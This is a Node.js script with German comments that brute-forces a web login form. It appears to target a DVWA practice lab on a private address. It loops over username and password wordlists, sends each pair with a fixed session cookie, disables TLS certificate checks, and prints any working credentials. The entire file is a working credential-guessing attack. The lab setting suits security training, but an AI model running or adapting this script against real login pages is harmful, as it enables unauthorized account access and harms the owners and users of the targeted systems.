const axios = require('axios');
const fs = require('fs');
const https = require('https');

const agent = new https.Agent({ rejectUnauthorized: false });

async function tryCredentials(username, password, bruteUrl, sessionId) {
    const cookies = `PHPSESSID=${sessionId}; security=low`;
    const params = new URLSearchParams({
        username: username,
        password: password,
        Login: 'Login',
        Submit: 'Submit'
    });

    try {
        // Erste Anfrage, um die Session zu initialisieren
        await axios.get(bruteUrl, {
            headers: { Cookie: cookies },
            httpsAgent: agent
        });

        // Zweite Anfrage für den Login-Versuch
        const response = await axios.get(bruteUrl, {
            params: params,
            headers: { Cookie: cookies },
            httpsAgent: agent
        });

        console.log(`\nTrying ${username}:${password}`);

        if (response.data.includes("Username and/or password incorrect")) {
            console.log("Falsche Kombination");
            return false;
        } else if (response.data.includes("Welcome to the password protected area")) {
            console.log("Richtiges Passwort wurde gefunden");
            return { success: true, username, password };
        } else {
            console.log(`Response length: ${response.data.length}`);
            console.log("Response preview:");
            console.log(response.data.substring(0, 200));
            return false;
        }
    } catch (error) {
        console.error(`Error occurred: ${error.message}`);
        return false;
    }
}

async function main() {
    const sessionId = "98ab56354355a971044439b9ea0cf629";
    const bruteUrl = "http://10.115.2.9:4280/vulnerabilities/brute/";

    const usernames = fs.readFileSync('usernames.txt', 'utf-8').split('\n').map(line => line.trim());
    const passwords = fs.readFileSync('password.txt', 'utf-8').split('\n').map(line => line.trim());

    console.log(`Starting brute force attack with ${usernames.length} usernames and ${passwords.length} passwords`);
    console.log(`Using session ID: ${sessionId}`);
    console.log(`Target URL: ${bruteUrl}`);

    try {
        const testResponse = await axios.get(bruteUrl, {
            headers: { Cookie: `PHPSESSID=${sessionId}; security=low` },
            httpsAgent: agent
        });
        if (testResponse.status !== 200) {
            console.log(`Connection test failed with status code: ${testResponse.status}`);
            return;
        }
        console.log("Connection test successful");
    } catch (error) {
        console.error(`Connection test failed: ${error.message}`);
        return;
    }

    for (const username of usernames) {
        for (const password of passwords) {
            const result = await tryCredentials(username, password, bruteUrl, sessionId);
            if (result.success) {
                console.log("\nRichtige Kombination wurde gefunden, diese lautet:");
                console.log(`Username: ${result.username}`);
                console.log(`Password: ${result.password}`);
                return;
            }
        }
    }
    console.log("\nNo valid credentials found.");
}

main();